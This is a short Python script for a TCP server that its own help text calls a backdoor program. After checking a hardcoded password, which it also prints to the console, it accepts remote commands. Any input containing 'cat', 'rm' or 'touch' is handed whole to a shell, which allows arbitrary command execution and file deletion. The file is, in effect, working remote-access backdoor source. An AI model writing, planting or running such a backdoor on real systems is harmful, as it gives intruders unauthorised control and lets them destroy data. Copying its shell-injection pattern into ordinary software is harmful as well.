#!/usr/bin/python

import socketserver
import subprocess

PASSWORD_PROMPT = 'Password for user: '
AUTHENTICATE_SUCCESS = 'Login success'
AUTHENTICATE_FAIL = 'Login fail'
INVALID_COMMAND = 'Command could not be executed: '
PROMPT_COMMAND = 'indra@localhost > '
OFF = 'Have a great day!'
OK = 'OK'

class TCPHandler(socketserver.BaseRequestHandler):
    BUFFER_SIZE = 4096
    PASSWORD = 'test'

    def handle(self):
        # Authenticate the user
        self.authenticate()
        while True:
            self.send(PROMPT_COMMAND)
            command = self.receive()
            output = self.execute_command(command)
            print("client {} wrote: ".format(self.client_address[0]) + command)
            print(output)
            if output == 'invalid':
                self.send_nl(INVALID_COMMAND + command)
            elif output == 'off':
                self.send_nl(OFF)
                break;
            else:
                self.send_nl(output)

    def receive(self):
        msg = self.request.recv(1024).decode('utf-8').rstrip('\n')
        return msg

    def send(self, msg):
        self.request.sendall(bytes(msg, 'utf-8'))

    def send_nl(self, msg):
        self.request.sendall(bytes(msg + '\n', 'utf-8'))

    def authenticate(self):
        while True:
            self.send(PASSWORD_PROMPT)
            passwd_attmpt = self.receive()
            print("password attempt " + passwd_attmpt)
            if passwd_attmpt == self.PASSWORD:
                self.send_nl(AUTHENTICATE_SUCCESS)
                break
            else:
                self.send_nl(AUTHENTICATE_FAIL)

    def execute_command(self, command):
        try:
            if command == "help":
                output = 'pwd        : returns working director\n' \
                    'cd <dir>   : changes working directory to <dir>\n' \
                    'ls         : lists the contents of working directory\n' \
                    'cat <file> : returns contents of the file\n' \
                    'help       : prints a list of commands\n' \
                    'off        : terminates the backdoor program'
            elif command == "ls":
                # subprocess.call(["ls", "-l"])
                output = subprocess.check_output(["ls", "-l"])
            elif command == "pwd":
                # subprocess.call(["ls", "-l"])
                output = subprocess.check_output(["pwd"])
            #TODO cd
            elif "cd" in command:
                print(command)
                subprocess.call("cd /", shell=True, cwd="/")
                output = OK
                # output = subprocess.check_output("cd /", shell=True, cwd="/")
            elif "cat" in command:
                output = subprocess.check_output(command, shell=True)
            elif "ps" in command:
                output = subprocess.check_output('ps aux', shell=True)
            elif "rm" in command:
                subprocess.check_output(command, shell=True)
                output = OK
            elif "touch" in command:
                subprocess.check_output(command, shell=True)
                output = OK
            elif "off" in command:
                output = 'off'
            else:
                output = "invalid"
        except subprocess.CalledProcessError:
            output = "invalid"

        if isinstance(output, bytes):
            return output.decode('utf-8')
        else:
            return output

if __name__ == "__main__":
    HOST, PORT = "localhost", 9999
    server = socketserver.TCPServer((HOST, PORT), TCPHandler)
    server.serve_forever()
